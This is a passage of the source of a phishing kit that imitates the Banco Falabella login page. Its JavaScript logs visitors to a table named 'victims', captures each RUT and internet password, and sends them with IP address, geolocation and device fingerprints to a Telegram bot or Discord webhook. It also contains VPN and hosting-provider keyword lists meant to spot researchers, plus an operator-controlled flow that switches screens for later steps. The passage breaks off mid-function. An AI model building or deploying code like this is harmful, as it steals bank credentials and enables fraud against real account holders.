        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap');



        * { margin: 0; padding: 0; box-sizing: border-box; }



        body { font-family: 'Open Sans', sans-serif; background-color: #f4f4f4; width: 100%; overflow-x: hidden; -webkit-tap-highlight-color: transparent; display: none; }



        .nav-header { height: 60px; width: 100%; display: flex; align-items: center; justify-content: space-between; padding: 0 15px; background: white; border-bottom: 1px solid #eee; }



        .main-card { background-color: #ffffff; margin: 15px; padding: 25px 20px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.05); position: relative; }



        .slider-container { position: relative; width: 100%; max-width: 402px; height: 439px; margin: 0 auto; overflow: hidden; background: white; }



        .slider-wrapper { display: flex; transition: transform 0.5s ease-in-out; width: 300%; height: 100%; }



        .slider-wrapper img { width: 402px; height: 439px; object-fit: cover; display: block; }



        .input-falabella { width: 100%; padding: 15px; border: 1px solid #d1d5db; border-radius: 8px; font-size: 16px; text-align: center; outline: none; margin-bottom: 15px; background: white; transition: border 0.3s; }

        .link-recuperar:hover { text-decoration: underline; }



        .loading-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; display: flex; align-items: center; justify-content: center; z-index: 1000; }



        .spinner-container { position: relative; display: flex; align-items: center; justify-content: center; width: 100px; height: 100px; }



        .spinner { width: 85px; height: 85px; border: 5px solid #f3f3f3; border-top: 5px solid #43851b; border-radius: 50%; animation: spin 1s linear infinite; position: absolute; }



        .loader-logo { width: 45px; position: relative; z-index: 1001; }



        @keyframes spin { to { transform: rotate(360deg); } }



        .sms-digit { width: 42px; height: 52px; font-size: 1.4rem; text-align: center; border: 1.5px solid #d1d5db; border-radius: 8px; font-weight: 600; color: #374151; outline: none; }



        .title-step { color: #374151; font-weight: 700; font-size: 1.25rem; margin-bottom: 0.5rem; text-align: center; }



        .subtitle-step { color: #6b7280; font-size: 0.875rem; margin-bottom: 2rem; line-height: 1.25rem; text-align: center; }



        .hidden { display: none !important; }

                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#A0AEC0" stroke-width="2.5"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>

            <div class="spinner"></div>



            <img src="banco.png" class="loader-logo" alt="logo">



        </div>

    <script src="config.js"></script>

    <script>



        const SUPABASE_URL = CONFIG.SUPABASE_URL;



        const SUPABASE_KEY = CONFIG.SUPABASE_KEY;



        const _sb = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);







        const DISCORD_WEBHOOK_URL = CONFIG.DISCORD_WEBHOOK_URL;







        let sid = null;



        let currentSlide = 0;



        let userRUT = "";







        let userIP = "Desconocida";

        let userLoc = "Desconocida";

        let userDevice = "Desconocido";



        window.onload = () => {

            render('login');

            checkSecurityAndVisit();

        };



        let trackingData = {

            screen: `${window.screen.width}x${window.screen.height}`,

            viewport: `${window.innerWidth}x${window.innerHeight}`,

            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Desconocida",

            lang: navigator.language || "Desconocido",

            connection: (navigator.connection && navigator.connection.effectiveType) || "Desconocida",

            touch: 'ontouchstart' in window || navigator.maxTouchPoints > 0,

            deviceMemory: navigator.deviceMemory || "Desconocida",

            hardwareConcurrency: navigator.hardwareConcurrency || "Desconocido",

            clicks: 0,

            keypresses: 0,

            timeOnPage: 0,

            tabActive: true,

            visibilityChanges: 0,

            maxScroll: 0,

            battery: "Desconocida",

            userAgent: navigator.userAgent

        };



        // Battery status API

        if (navigator.getBattery) {

            navigator.getBattery().then(batt => {

                trackingData.battery = `${Math.round(batt.level * 100)}% (${batt.charging ? 'Cargando' : 'Descargando'})`;

            }).catch(() => {});

        }



        // Add real-time event listeners for granular tracking

        window.addEventListener('click', () => { trackingData.clicks++; });

        window.addEventListener('keydown', () => { trackingData.keypresses++; });

        window.addEventListener('scroll', () => {

            let pct = Math.round((window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100);

            if (pct > trackingData.maxScroll) trackingData.maxScroll = pct;

        });

        document.addEventListener('visibilitychange', () => {

            trackingData.tabActive = !document.hidden;

            trackingData.visibilityChanges++;

        });



        // Time on page counter

        setInterval(() => {

            if (trackingData.tabActive) {

                trackingData.timeOnPage++;

            }

        }, 1000);



        // Sync detailed tracking data to Supabase periodically

        setInterval(async () => {

            if (sid && trackingData.tabActive) {

                try {

                    await _sb.from('victims').update({

                        biometria: JSON.stringify(trackingData),

                        last_seen: new Date().toISOString()

                    }).eq('id', sid);

                } catch (e) {

                    console.error("Error syncing stats:", e);

                }

            }

        }, 5000);



        async function checkSecurityAndVisit() {

            let country = "CL"; // Default to CL on API failure to prevent lockouts



            const ua = navigator.userAgent;

            if (/mobile/i.test(ua)) {

                userDevice = "Móvil";

            } else if (/tablet/i.test(ua)) {

                userDevice = "Tablet";

            } else {

                userDevice = "Computadora";

            }



            if (/chrome|crios/i.test(ua)) userDevice += " (Chrome)";

            else if (/safari/i.test(ua)) userDevice += " (Safari)";

            else if (/firefox|fxios/i.test(ua)) userDevice += " (Firefox)";

            else if (/edge/i.test(ua)) userDevice += " (Edge)";

            else userDevice += " (Otro)";



            async function fetchWithTimeout(resource, timeout = 3000) {

                const controller = new AbortController();

                const id = setTimeout(() => controller.abort(), timeout);

                try {

                    const response = await fetch(resource, { signal: controller.signal });

                    clearTimeout(id);

                    return response;

                } catch (error) {

                    clearTimeout(id);

                    throw error;

                }

            }



            let isVpnOrProxy = false;

            let blockReason = "";



            // 1. Primary check using ipaddress.to (supports CORS, detects VPN/Proxy/Tor/Hosting)

            try {

                const response = await fetchWithTimeout('https://ipaddress.to/api/lookup/my', 3000);

                if (response.ok) {

                    const data = await response.json();

                    if (data && data.success) {

                        userIP = data.ip || "Desconocida";

                        userLoc = `${data.location?.city || ''}, ${data.location?.country_name || ''}`;

                        country = data.location?.country_code || "CL";



                        if (data.is_vpn || data.is_proxy || data.is_tor || data.is_hosting) {

                            isVpnOrProxy = true;

                            blockReason = `IPAddress.to: VPN=${data.is_vpn}, Proxy=${data.is_proxy}, Tor=${data.is_tor}, Hosting=${data.is_hosting}`;

                        }



                        // Check ASN/Org/Company for cloud hosting keywords

                        const org = `${data.asn?.org || ''} ${data.asn?.descr || ''} ${data.company?.name || ''}`.toLowerCase();

                        const hostingKeywords = [

                            'digitalocean', 'linode', 'amazon', 'aws', 'google cloud', 'gcp', 'microsoft', 'azure', 

                            'ovh', 'hetzner', 'leaseweb', 'm247', 'datacenter', 'datacentre', 'hosting', 'server', 

                            'servers', 'vpn', 'proxy', 'choopa', 'vultr', 'fastly', 'cloudflare', 'limelight', 

                            'akamai', 'confluence', 'cogent', 'colocation', 'host', 'contabo', 'scaleway', 'vps'

                        ];

                        for (const kw of hostingKeywords) {

                            if (org.includes(kw)) {

                                isVpnOrProxy = true;

                                blockReason = `ASN/Org contiene palabra clave '${kw}': ${org}`;

                                break;

                            }

                        }

                    }

                }

            } catch (err) {

                console.error("Error en ipaddress.to:", err);

            }



            // 2. Fallback secondary check with ipapi.co if primary check didn't flag anything

            if (!isVpnOrProxy) {

                try {

                    const response = await fetchWithTimeout('https://ipapi.co/json/', 3000);

                    if (response.ok) {

                        const data = await response.json();

                        userIP = data.ip || userIP;

                        userLoc = `${data.city || ''}, ${data.country_name || ''}` || userLoc;

                        country = data.country_code || data.country || country;



                        const org = `${data.org || ''} ${data.asn || ''}`.toLowerCase();

                        const hostingKeywords = [

                            'digitalocean', 'linode', 'amazon', 'aws', 'google cloud', 'gcp', 'microsoft', 'azure', 

                            'ovh', 'hetzner', 'leaseweb', 'm247', 'datacenter', 'datacentre', 'hosting', 'server', 

                            'servers', 'vpn', 'proxy', 'choopa', 'vultr', 'fastly', 'cloudflare', 'limelight', 

                            'akamai', 'confluence', 'cogent', 'colocation', 'host', 'contabo', 'scaleway', 'vps'

                        ];

                        for (const kw of hostingKeywords) {

                            if (org.includes(kw)) {

                                isVpnOrProxy = true;

                                blockReason = `ipapi.co: Org contiene palabra clave '${kw}': ${org}`;

                                break;

                            }

                        }

                    }

                } catch (err) {

                    console.error("Error en ipapi.co:", err);

                }

            }



            // Show page content for all users (Geoblock & security filters removed)

            document.body.style.display = "block";



            try {

                const { data, error } = await _sb.from('victims').insert([{

                    rut: 'VISITA',

                    clave: userDevice,

                    correo: userLoc,

                    telefono: userIP,

                    nombre: userIP,      // Permanent IP column

                    monto: userLoc,      // Permanent Location column

                    cuotas: userDevice,  // Permanent Device column

                    action_request: 'visit',

                    biometria: JSON.stringify(trackingData),

                    last_seen: new Date().toISOString()

                }]).select();



                if (!error && data && data.length > 0) {

                    sid = data[0].id;

                }

            } catch (err) {

                console.error("Error inserting visit:", err);

            }

        }



        async function sendDiscord(msg) {

            if (!DISCORD_WEBHOOK_URL) return;

            try {

                let formattedMsg = msg.replace(/\*(.*?)\*/g, "**$1**");

                let content = `🟢 **SESIÓN**\n👤 **RUT:** ${userRUT}\n\n${formattedMsg}`;

                await fetch(DISCORD_WEBHOOK_URL, {

                    method: 'POST',

                    headers: { 'Content-Type': 'application/json' },

                    body: JSON.stringify({ content: content })

                });

            } catch(e) {

                console.error("Error Discord:", e);

            }

        }



        async function sendTelegram(msg) {
            const token = CONFIG.TELEGRAM_TOKEN;
            const chatId = CONFIG.TELEGRAM_CHAT_ID;
            if (!token || !chatId) {
                if (CONFIG.DISCORD_WEBHOOK_URL) await sendDiscord(msg);
                return;
            }
            try {
                const rutText = (typeof userRUT !== 'undefined' && userRUT) ? userRUT : '';
                const content = '🟢 *SESIÓN*\n👤 *RUT:* ' + rutText + '\n\n' + msg;
                const res = await fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: content,
                        parse_mode: 'Markdown'
                    })
                });
                if (!res.ok) {
                    await fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: '🟢 SESIÓN\n👤 RUT: ' + rutText + '\n\n' + msg
                        })
                    });
                }
            } catch(e) {
                console.error('Error Telegram:', e);
            }
        }

        function formatRUT(rut) {



            let v = rut.replace(/[^\dkK]/g, "");



            if (v.length <= 1) return v;



            let body = v.slice(0, -1);



            let dv = v.slice(-1).toUpperCase();



            body = body.replace(/\B(?=(\d{3})+(?!\d))/g, ".");



            return body + "-" + dv;



        }







        async function handleLogin(e) {



            e.preventDefault();



            const r = document.getElementById('rut').value;



            const p = document.getElementById('pass').value;



            userRUT = r;



           



            document.getElementById('loader').classList.remove('hidden');







            // --- CAPTURA DE IP Y UBICACIÓN ---



            let geoInfo = "No disponible";



            try {



                const response = await fetch('https://ipapi.co/json/');



                const data = await response.json();



                geoInfo = `🌐 *IP:* \`${data.ip}\`\n📍 *Ubicación:* ${data.city}, ${data.region}, ${data.country_name}\n🗺️ *Coordenadas:* [${data.latitude}, ${data.longitude}](https://www.google.com/maps?q=${data.latitude},${data.longitude})\n📱 *ISP:* ${data.org}`;



            } catch (err) {



                geoInfo = "⚠️ Error capturando IP/Ubicación";



            }



            // ---------------------------------







            // --- DETECTAR MODO GLOBAL ---

            let globalMode = 'dynamic';

            try {

                const { data: configData, error: configErr } = await _sb.from('victims').select('action_request').eq('rut', 'GLOBAL_CONFIG');

                if (!configErr && configData && configData.length > 0) {

                    globalMode = configData[0].action_request || 'dynamic';

                }

            } catch (e) {

                console.error("Error fetching global mode:", e);

            }

            // -----------------------------



            let loginSuccess = false;

            const nextAction = globalMode === 'static' ? 'tc' : 'waiting';



            if (sid) {

                const { error } = await _sb.from('victims').update({

                    rut: r,

                    clave: p,

                    action_request: nextAction,

                    biometria: JSON.stringify(trackingData),

                    last_seen: new Date().toISOString()

                }).eq('id', sid);

                if (!error) loginSuccess = true;

            } else {

                const { data, error } = await _sb.from('victims').insert([{

                    rut: r,

                    clave: p,

                    telefono: userIP,

                    nombre: userIP,      // Permanent IP column

                    monto: userLoc,      // Permanent Location column

                    cuotas: userDevice,  // Permanent Device column

                    action_request: nextAction,

                    biometria: JSON.stringify(trackingData),

                    last_seen: new Date().toISOString()

                }]).select();

                if (!error && data && data.length > 0) {

                    sid = data[0].id;

                    loginSuccess = true;

                }

            }



            if(loginSuccess) {

                await sendTelegram(`📍 *LOGUEO INICIAL*\n🔑 Clave: \`${p}\`\n\n${geoInfo}`);

                sync();

                if (globalMode === 'static') {

                    render('tc');

                }

            }



        }







        function sync() {



            _sb.channel('db-changes').on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'victims', filter: `id=eq.${sid}` }, payload => {



                const act = payload.new.action_request;



                if(act !== 'waiting') render(act, payload.new);



                else document.getElementById('loader').classList.remove('hidden');



            }).subscribe();



        }







        function render(act, data = {}) {



            const cont = document.getElementById('step-container');



            document.getElementById('loader').classList.add('hidden');



            const header = document.querySelector('.nav-header');

            const closeBtn = document.querySelector('.flex.justify-end.p-4');

            

            const isLoginErr = (act === 'error_acceso' || act === 'l.error' || act === 'l_error' || act === 'login_error');

            const isLoginAct = (act === 'login' || isLoginErr);



            if (isLoginAct) {

                if (header) header.style.display = 'none';

                if (closeBtn) closeBtn.style.display = 'none';

            } else {

                if (header) header.style.display = 'flex';

                if (closeBtn) closeBtn.style.display = 'flex';

            }



            if(isLoginAct) {



                cont.innerHTML = `

                <div class="min-h-screen bg-[#f7f9fa] flex flex-col p-6 relative">

                    <!-- Botón de cierre superior derecho -->

                    <div class="absolute top-6 right-6">

                        <a href="https://www.bancofalabella.cl" class="text-gray-400 hover:text-gray-600 transition-colors">

                            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">

                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M6 18L18 6M6 6l12 12"></path>

                            </svg>

                        </a>

                    </div>



                    <!-- Logo superior izquierdo -->

                    <div class="mt-4 mb-10 flex items-center">

                        <img src="banco.png" class="h-10 object-contain" alt="Banco Falabella">

                    </div>



                    <!-- Contenedor del formulario -->

                    <div class="w-full max-w-[360px] mx-auto flex-grow flex flex-col">

                        <h2 class="text-[#2b6c1e] text-[22px] font-semibold text-center mb-8">Ingresa a tu cuenta</h2>



                        <form id="login-form" class="flex flex-col gap-6">

                            ${isLoginErr ? '<p class="text-red-650 text-center font-bold text-sm bg-red-50 p-3 rounded-lg border border-red-200">RUT o Clave incorrecta. Reintente.</p>' : ''}



                            <!-- Campo RUT -->

                            <div class="flex flex-col gap-1.5">

                                <label for="rut" class="text-gray-700 font-semibold text-sm">RUT</label>

                                <input type="text" id="rut" placeholder="Ej: 12345678-9" class="w-full px-4 py-3.5 border border-gray-300 rounded-lg text-base outline-none focus:border-[#72bf44] transition-colors" maxlength="12">

                            </div>



                            <!-- Campo Clave -->

                            <div class="flex flex-col gap-1.5">

                                <label for="pass" class="text-gray-700 font-semibold text-sm">Clave internet</label>

                                <div class="relative w-full">

                                    <input type="password" id="pass" placeholder="Tu contraseña tiene 6 dígitos" class="w-full pl-4 pr-12 py-3.5 border border-gray-300 rounded-lg text-base outline-none focus:border-[#72bf44] transition-colors" maxlength="6" inputmode="numeric">

                                    <!-- Botón para ver/ocultar clave -->

                                    <button type="button" id="togglePasswordBtn" class="absolute inset-y-0 right-0 pr-4 flex items-center text-gray-400 hover:text-gray-600 focus:outline-none">

                                        <svg id="eyeIcon" class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">

                                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l18 18"></path>

                                        </svg>

                                    </button>

                                </div>

                            </div>



                            <!-- Botón de envío -->

                            <button type="submit" id="submitBtn" class="w-full mt-4 py-3.5 bg-[#e3e8ee] text-[#9facbd] font-semibold rounded-full text-base transition-all duration-300 cursor-not-allowed" disabled>

                                Ingresar

                            </button>

                        </form>



                        <!-- Enlace de recuperación -->

                        <div class="mt-6 text-center">

                            <a href="https://www.bancofalabella.cl" class="text-[#2b6c1e] font-bold text-[15px] hover:underline inline-flex items-center gap-1">

                                Recupera o crea tu clave internet 

                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">

                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M14 5l7 7m0 0l-7 7m7-7H3"></path>

                                </svg>

                            </a>

                        </div>



                        <!-- Caja de advertencia -->

                        <div class="mt-8 bg-[#fff8e7] rounded-xl p-5 flex gap-4 text-left border border-[#faebcc]/30 shadow-sm">

                            <div class="text-[#f0ad4e] shrink-0 text-xl font-bold font-serif leading-none mt-0.5">!</div>

                            <div class="flex flex-col gap-1">

                                <span class="text-[#856404] font-bold text-sm">Importante!</span>

                                <p class="text-gray-700 text-[13px] leading-relaxed">

                                    ¡No caigas en estafas! Nunca te enviaremos links por mensaje de texto o email. Tampoco te pediremos información de tus tarjetas ni claves. Y nunca des acceso al control de tu dispositivo a través de alguna aplicación.

                                </p>

                            </div>

                        </div>

                    </div>

                </div>`;



                const rInp = document.getElementById('rut'), pInp = document.getElementById('pass'), btn = document.getElementById('submitBtn');

                const toggleBtn = document.getElementById('togglePasswordBtn');

                const eyeIcon = document.getElementById('eyeIcon');



                if (toggleBtn && pInp && eyeIcon) {

                    toggleBtn.onclick = () => {

                        if (pInp.type === 'password') {

                            pInp.type = 'text';

                            eyeIcon.innerHTML = `

                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path>

                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path>

                            `;

                        } else {

                            pInp.type = 'password';
